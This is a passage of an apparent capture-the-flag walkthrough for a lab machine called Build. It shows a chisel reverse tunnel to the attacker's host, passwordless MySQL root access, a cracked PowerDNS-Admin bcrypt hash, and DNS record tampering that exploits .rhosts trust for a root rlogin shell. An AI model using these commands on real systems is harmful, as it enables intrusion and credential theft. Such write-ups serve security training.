+                                 Dload  Upload   Total   Spent    Left  Speed
+100 8736k  100 8736k    0     0  4460k      0  0:00:01  0:00:01 --:--:-- 4459k
+</span><span class="gp">root@5ac6c7d6fb8e:~#</span><span class="w"> </span><span class="nb">chmod</span> +x c
+<span class="gp">root@5ac6c7d6fb8e:~#</span><span class="w"> </span>./c client 10.10.14.79:8000 R:socks
+<span class="go">2025/07/30 10:35:52 client: Connecting to ws://10.10.14.79:8000
+2025/07/30 10:35:52 client: Connected (Latency 89.243677ms)
+</span></code></pre></div></div>
+<p>Chisel listens on 1080 as a socks proxy. I’ve got a proxy configured in <a href="https://www.youtube.com/watch?v=iTm33Miymdg">FoxyProxy</a> to use this tunnel:</p>
+<picture>
+<source srcset="/img/image-20250730062308729.webp" type="image/webp"/>
+<img alt="image-20250730062308729" class="include_image" loading="lazy" src="/img/image-20250730062308729.png"/>
+</picture>
+<p>I’ll switch to that profile and load <code class="language-plaintext highlighter-rouge">http://172.18.0.6/</code>:</p>
+<picture>
+<source srcset="/img/image-20250730062332640.webp" type="image/webp"/>
+<img alt="image-20250730062332640" class="include_image" loading="lazy" src="/img/image-20250730062332640.png"/>
+</picture>
+<p>Trying to visit <code class="language-plaintext highlighter-rouge">http://172.18.0.5:8081</code> pops HTTP basic auth:</p>
+<picture>
+<source srcset="/img/image-20250730062445556.webp" type="image/webp"/>
+<img alt="image-20250730062445556" class="include_image" loading="lazy" src="/img/image-20250730062445556.png"/>
+</picture>
+<p>I can also use <code class="language-plaintext highlighter-rouge">proxychains</code> to connect from the command line. My <code class="language-plaintext highlighter-rouge">proxychains.conf</code> file is set up to use 127.0.0.1:1080 as a socks proxy:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">cat</span> /etc/proxychains.conf | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s1">'^#'</span> | <span class="nb">grep</span> <span class="nb">.</span>
+<span class="go">strict_chain
+proxy_dns 
+tcp_read_time_out 15000
+tcp_connect_time_out 8000
+[ProxyList]
+socks5  127.0.0.1 1080
+</span></code></pre></div></div>
+<p>This works to use the tunnel as well:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>proxychains4 curl 172.18.0.6 <span class="nt">-I</span>
+<span class="go">[proxychains] config file found: /etc/proxychains.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.18.0.6:80  ...  OK
+HTTP/1.1 302 FOUND
+Server: gunicorn
+Date: Wed, 30 Jul 2025 11:01:04 GMT
+Connection: close
+Content-Type: text/html; charset=utf-8
+Content-Length: 199
+Location: /login
+Set-Cookie: _csrf_token=1f1bf92e2e293b81e4fa45db731e1f9d1bfa42a769e5d18809945a3308cc2621; Expires=Mon, 04 Aug 2025 11:01:04 GMT; Max-Age=432000; HttpOnly; Path=/; SameSite=Lax
+Vary: Cookie
+Set-Cookie: session=e0ad8f3f-4061-425a-9b48-c08f0ebf1325; Expires=Wed, 30 Jul 2025 11:11:04 GMT; HttpOnly; Path=/; SameSite=Lax
+</span></code></pre></div></div>
+<h4 id="mysql">MySQL</h4>
+<p>I don’t have any password information for the MySQL service, but I can try connecting as root and it let’s met in:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>proxychains4 mysql <span class="nt">-h</span> 172.18.0.4 <span class="nt">-u</span> root
+<span class="go">[proxychains] config file found: /etc/proxychains.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.18.0.4:3306  ...  OK
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 222
+Server version: 11.3.2-MariaDB-1:11.3.2+maria~ubu2204 mariadb.org binary distribution
+...[snip]...
+</span><span class="gp">mysql&gt;</span><span class="w">
+</span></code></pre></div></div>
+<p>The non-default DB is <code class="language-plaintext highlighter-rouge">powerdnsadmin</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">mysql&gt; </span>show databases<span class="p">;</span>
+<span class="go">+--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| powerdnsadmin      |
+| sys                |
++--------------------+
+5 rows in set (0.09 sec)
+</span></code></pre></div></div>
+<p>Switching to that DB, there are several tables:</p>
+<div class="language-console code-collapse highlighter-rouge" data-trunc="300"><div class="highlight"><pre class="highlight"><code><span class="gp">mysql&gt; </span>use powerdnsadmin
+<span class="go">Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+</span><span class="gp">mysql&gt; </span>show tables<span class="p">;</span>
+<span class="go">+-------------------------+
+| Tables_in_powerdnsadmin |
++-------------------------+
+| account                 |
+| account_user            |
+| alembic_version         |
+| apikey                  |
+| apikey_account          |
+| comments                |
+| cryptokeys              |
+| domain                  |
+| domain_apikey           |
+| domain_setting          |
+| domain_template         |
+| domain_template_record  |
+| domain_user             |
+| domainmetadata          |
+| domains                 |
+| history                 |
+| records                 |
+| role                    |
+| sessions                |
+| setting                 |
+| supermasters            |
+| tsigkeys                |
+| user                    |
++-------------------------+
+23 rows in set (0.09 sec)
+</span></code></pre></div></div>
+<p>There’s a single user:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">mysql&gt; </span><span class="k">select</span> <span class="k">*</span> from user<span class="p">;</span>
+<span class="go">+----+----------+--------------------------------------------------------------+-----------+----------+----------------+------------+---------+-----------+
+| id | username | password                                                     | firstname | lastname | email          | otp_secret | role_id | confirmed |
++----+----------+--------------------------------------------------------------+-----------+----------+----------------+------------+---------+-----------+
+|  1 | admin    | $2b$12$s1hK0o7YNkJGfu5poWx.0u1WLqKQIgJOXWjjXz7Ze3Uw5Sc2.hsEq | admin     | admin    | admin@build.vl | NULL       |       1 |         0 |
++----+----------+--------------------------------------------------------------+-----------+----------+----------------+------------+---------+-----------+
+1 row in set (0.08 sec)
+</span></code></pre></div></div>
+<p>Most of the other tables are empty. There is one domain:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">mysql&gt; </span><span class="k">select</span> <span class="k">*</span> from domain<span class="p">;</span>
+<span class="go">+----+----------+--------+--------+------------+-----------------+------------+--------+------------+
+| id | name     | master | type   | serial     | notified_serial | last_check | dnssec | account_id |
++----+----------+--------+--------+------------+-----------------+------------+--------+------------+
+|  1 | build.vl | []     | Native | 2024050201 |               0 |          0 |      0 |       NULL |
++----+----------+--------+--------+------------+-----------------+------------+--------+------------+
+1 row in set (0.09 sec)
+</span></code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">history</code> table has interesting history:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">mysql&gt; </span><span class="k">select</span> <span class="k">*</span> from <span class="nb">history</span><span class="p">;</span>
+<span class="go">+----+---------------------------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+------------+---------------------+-----------+
+| id | msg                                   | detail                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           | created_by | created_on          | domain_id |
++----+---------------------------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+------------+---------------------+-----------+
+|  1 | User admin authentication succeeded   | {"username": "admin", "authenticator": "LOCAL", "ip_address": "192.168.94.139", "success": 1}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    | System     | 2024-05-01 15:54:31 |      NULL |
+|  2 | Add zone build.vl                     | {"domain_type": "native", "domain_master_ips": [], "account_id": "0"}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            | admin      | 2024-05-01 15:54:43 |         1 |
+|  3 | Apply record changes to zone build.vl | {"domain": "build.vl", "add_rrsets": [{"name": "gitea.build.vl.", "type": "A", "ttl": 60, "records": [{"content": "172.19.0.2", "disabled": false}], "comments": [{"content": "", "account": ""}], "changetype": "REPLACE"}, {"name": "intern.build.vl.", "type": "A", "ttl": 60, "records": [{"content": "172.20.0.1", "disabled": false}], "comments": [{"content": "", "account": ""}], "changetype": "REPLACE"}, {"name": "jenkins.build.vl.", "type": "A", "ttl": 60, "records": [{"content": "172.20.0.2", "disabled": false}], "comments": [{"content": "", "account": ""}], "changetype": "REPLACE"}, {"name": "pdns.build.vl.", "type": "A", "ttl": 60, "records": [{"content": "172.18.0.3", "disabled": false}], "comments": [{"content": "", "account": ""}], "changetype": "REPLACE"}], "del_rrsets": []}                                                                                                                                                                                                                                           | admin      | 2024-05-01 15:56:57 |         1 |
+|  4 | User admin authentication succeeded   | {"username": "admin", "authenticator": "LOCAL", "ip_address": "192.168.94.139", "success": 1}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    | System     | 2024-05-01 16:32:24 |      NULL |
+|  5 | User admin authentication succeeded   | {"username": "admin", "authenticator": "LOCAL", "ip_address": "192.168.94.139", "success": 1}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    | System     | 2024-05-02 10:07:19 |      NULL |
+|  6 | Apply record changes to zone build.vl | {"domain": "build.vl", "add_rrsets": [{"name": "db.build.vl.", "type": "A", "ttl": 60, "records": [{"content": "172.18.0.4", "disabled": false}], "comments": [{"content": "", "account": ""}], "changetype": "REPLACE"}, {"name": "gitea.build.vl.", "type": "A", "ttl": 60, "records": [{"content": "172.18.0.2", "disabled": false}], "comments": [{"content": "", "account": ""}], "changetype": "REPLACE"}, {"name": "intern.build.vl.", "type": "A", "ttl": 60, "records": [{"content": "172.18.0.1", "disabled": false}], "comments": [{"content": "", "account": ""}], "changetype": "REPLACE"}, {"name": "jenkins.build.vl.", "type": "A", "ttl": 60, "records": [{"content": "172.18.0.3", "disabled": false}], "comments": [{"content": "", "account": ""}], "changetype": "REPLACE"}, {"name": "pdns-worker.build.vl.", "type": "A", "ttl": 60, "records": [{"content": "172.18.0.5", "disabled": false}], "comments": [{"content": "", "account": ""}], "changetype": "REPLACE"}, {"name": "pdns.build.vl.", "type": "A", "ttl": 60, "records": [{"content": "172.18.0.6", "disabled": false}], "comments": [{"content": "", "account": ""}], "changetype": "REPLACE"}], "del_rrsets": [{"comments": [{"content": "", "account": ""}], "name": "jenkins.build.vl.", "records": [{"content": "172.20.0.2", "disabled": false}], "ttl": 60, "type": "A", "changetype": "DELETE"}, {"comments": [{"content": "", "account": ""}], "name": "pdns.build.vl.", "records": [{"content": "172.18.0.3", "disabled": false}], "ttl": 60, "type": "A", "changetype": "DELETE"}, {"comments": [{"content": "", "account": ""}], "name": "intern.build.vl.", "records": [{"content": "172.20.0.1", "disabled": false}], "ttl": 60, "type": "A", "changetype": "DELETE"}, {"comments": [{"content": "", "account": ""}], "name": "gitea.build.vl.", "records": [{"content": "172.19.0.2", "disabled": false}], "ttl": 60, "type": "A", "changetype": "DELETE"}]} | admin      | 2024-05-02 10:13:52 |         1 |
++----+---------------------------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+------------+---------------------+-----------+
+6 rows in set (0.09 sec)
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">records</code> shows a bunch of subdomains configured:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">mysql&gt; </span><span class="k">select</span> <span class="k">*</span> from records<span class="p">;</span>
+<span class="go">+----+-----------+----------------------+------+------------------------------------------------------------------------------------------+------+------+----------+-----------+------+
+| id | domain_id | name                 | type | content                                                                                  | ttl  | prio | disabled | ordername | auth |
++----+-----------+----------------------+------+------------------------------------------------------------------------------------------+------+------+----------+-----------+------+
+|  8 |         1 | db.build.vl          | A    | 172.18.0.4                                                                               |   60 |    0 |        0 | NULL      |    1 |
+|  9 |         1 | gitea.build.vl       | A    | 172.18.0.2                                                                               |   60 |    0 |        0 | NULL      |    1 |
+| 10 |         1 | intern.build.vl      | A    | 172.18.0.1                                                                               |   60 |    0 |        0 | NULL      |    1 |
+| 11 |         1 | jenkins.build.vl     | A    | 172.18.0.3                                                                               |   60 |    0 |        0 | NULL      |    1 |
+| 12 |         1 | pdns-worker.build.vl | A    | 172.18.0.5                                                                               |   60 |    0 |        0 | NULL      |    1 |
+| 13 |         1 | pdns.build.vl        | A    | 172.18.0.6                                                                               |   60 |    0 |        0 | NULL      |    1 |
+| 14 |         1 | build.vl             | SOA  | a.misconfigured.dns.server.invalid hostmaster.build.vl 2024050201 10800 3600 604800 3600 | 1500 |    0 |        0 | NULL      |    1 |
++----+-----------+----------------------+------+------------------------------------------------------------------------------------------+------+------+----------+-----------+------+
+7 rows in set (0.09 sec)
+</span></code></pre></div></div>
+<h4 id="powerdns-admin">PowerDNS-Admin</h4>
+<p>I’ll save the hash for the admin user to a file and pass it to <code class="language-plaintext highlighter-rouge">hashcat</code>. It looks a lot like bcrypt to me so I’ll use <code class="language-plaintext highlighter-rouge">-m 3200</code> (though running with autodetect would show a list of bcrypt options):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$ </span>hashcat powerdns.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt <span class="nt">-m</span> 3200
+<span class="go">hashcat (v6.2.6) starting
+...[snip]...
+$2b$12$s1hK0o7YNkJGfu5poWx.0u1WLqKQIgJOXWjjXz7Ze3Uw5Sc2.hsEq:winston
+...[snip]...
+</span></code></pre></div></div>
+<p>Now I can log in as admin, leaving the OTP token field empty (as it was Null in the <code class="language-plaintext highlighter-rouge">user</code> table):</p>
+<picture>
+<source srcset="/img/image-20250730071636582.webp" type="image/webp"/>
+<img alt="image-20250730071636582" class="include_image" loading="lazy" src="/img/image-20250730071636582.png"/>
+</picture>
+<p>In the <code class="language-plaintext highlighter-rouge">build.vl</code> zone, it shows the same subdomains as the table above:</p>
+<picture>
+<source srcset="/img/image-20250730071714049.webp" type="image/webp"/>
+<img alt="image-20250730071714049" class="include_image" loading="lazy" src="/img/image-20250730071714049.png"/>
+</picture>
+<p>This also helps confirm my analysis of the various containers.</p>
+<h3 id="shell-via-rlogin">Shell via rlogin</h3>
+<p>TCP 513 rlogin is open on the host and I already found a <code class="language-plaintext highlighter-rouge">.rhosts</code> file with two domains in it:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>admin.build.vl +
+intern.build.vl +
+</code></pre></div></div>
+<p>This says that coming from either of these domains, any can log in without a password. <code class="language-plaintext highlighter-rouge">intern.build.vl</code> is already set as the main host. <code class="language-plaintext highlighter-rouge">admin.build.vl</code> isn’t configured. I can edit the record for <code class="language-plaintext highlighter-rouge">intern</code> or add a record for <code class="language-plaintext highlighter-rouge">admin</code> pointing to my host, and then connect using <code class="language-plaintext highlighter-rouge">rlogin</code> as root.</p>
+<p>I’ll edit <code class="language-plaintext highlighter-rouge">admin</code>:</p>
+<picture>
+<source srcset="/img/image-20250730073050602.webp" type="image/webp"/>
+<img alt="image-20250730073050602" class="include_image" loading="lazy" src="/img/image-20250730073050602.png"/>
+</picture>
+<p><code class="language-plaintext highlighter-rouge">rlogin</code> logs in with the same username it’s being run as. On <a href="/2025/07/15/htb-reset.html#shell-as-radm">Reset</a>, I had to create a user named sadm. Here I can just run as root:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">sudo </span>rlogin 10.129.234.169
+<span class="go">Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-144-generic x86_64)
+...[snip]...
+</span><span class="gp">root@build:~#</span><span class="w">
+</span></code></pre></div></div>
+<p>And fetch <code class="language-plaintext highlighter-rouge">root.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@build:~#</span><span class="w"> </span><span class="nb">cat </span>root.txt
+<span class="go">b7b1e481************************
+</span></code></pre></div></div>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2025/08/05/htb-build.html"></a>
+</article>
